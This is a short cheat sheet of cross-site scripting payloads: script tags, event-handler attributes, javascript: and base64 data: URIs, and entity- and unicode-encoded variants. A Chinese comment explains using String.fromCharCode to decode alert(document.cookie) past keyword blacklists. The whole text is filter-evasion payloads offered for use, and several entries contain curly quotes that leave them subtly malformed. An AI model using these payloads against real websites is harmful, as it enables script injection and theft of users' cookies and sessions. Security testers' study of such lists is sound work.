```
<img src="x" onerror=alert(1)>
<img src=1 onmouseover=alert('xss’)>
<a href="javascript:alert(1)">baidu</a>
<a href="javascript:aaa" onmouseover="alert(/xss/)">aa</a>
<script>alert('xss')</script>
<script>prompt('xss')</script>
<input value="" onclick=alert('xss') type="text">
<input name="name" value="" onmouseover=prompt('xss') bad="">
<iframe src="javascript:alert('xss')"><iframe>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
<iframe src="aaa" onmouseover=alert('xss') /><iframe>
<iframe src="javascript&colon;prompt&lpar;`xss`&rpar;"></iframe>
<svg onload=alert(1)>
<input name="name" value="" onmouseover=prompt('xss') bad=“”>
<input type=“hidden” accesskey=“X” onclick=“alert(1)”>
eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))  
适用于绕过黑名单alert 在跨站中，String.fromCharCode主要是使到一些已经被列入黑名单的关键字或语句安全通过检测，把关键字或语句转换成为ASCII码，然后再用String.fromCharCode还原，
因为大多数的过滤系统都不会把String.fromCharCode加以过滤，例如关键字alert被过滤掉，那就可以这么利用alert(document.cookie)
<img src="1" onerror=alert(1)>
<img src="1" onerror=alert&#40;1&#41;>（实体化()
<img src=1 onerror=alert&#40&#41>
 <script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<img src="1" onerror=location="javascript:alert(1)”>
<img src="1" onerror=location="javascript:alert%281%29”>
```
